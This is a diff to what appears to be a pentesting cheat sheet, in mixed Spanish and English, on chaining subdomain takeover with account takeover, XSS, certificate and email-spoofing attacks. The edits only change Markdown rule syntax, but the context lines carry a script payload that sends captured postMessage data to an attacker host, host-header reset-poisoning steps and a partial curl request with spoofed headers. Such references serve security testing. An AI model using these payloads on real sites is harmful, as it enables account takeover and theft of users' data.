@@ -21,7 +21,7 @@ linked:
 ---
 # Subdomain Takeover - Chains con Otras Vulns
 
-***
+---
 
 ## ATO via Cookie / OAuth Chain
 
@@ -36,7 +36,7 @@ linked:
 | Combine HHI + reclaim: `Host: reset.target.com` (taken) → reset link arrives en atacante | Reset poisoning chain | HHI + SDT compound. |
 ^sdt-chain-ato
 
-___
+---
 
 ## XSS Persistente via Subdomain
 
@@ -51,7 +51,7 @@ ___
 | `<script>window.addEventListener('message',e=>fetch('//attacker?'+JSON.stringify(e.data)))</script>` en takeover sub | postMessage listener para captura | Cross-window data theft. |
 ^sdt-chain-xss
 
-___
+---
 
 ## HTTPS Cert Validation Bypass
 
@@ -66,7 +66,7 @@ ___
 | Combine MITM + cert: deploy en network where reclaimed sub IP es target | MITM con cert válido | Network-level attack. |
 ^sdt-chain-https
 
-___
+---
 
 ## Email Spoofing (SPF / DKIM)
 
@@ -82,7 +82,7 @@ ___
 | Trigger password reset con email a víctima → recibir reset link en MX takeover | ATO via email + MX combo | Compound chain. |
 ^sdt-chain-email
 
-___
+---
 
 ## Combine con HHI / Open Redirect / Cache Poisoning
 
@@ -135,4 +135,4 @@ curl -X POST -H "Host: target.com" -H "X-Forwarded-Host: docs.target.com" \
 # CVSS: Critical (9.8) — HHI + SDT compound.
 ```
 
-***
+---
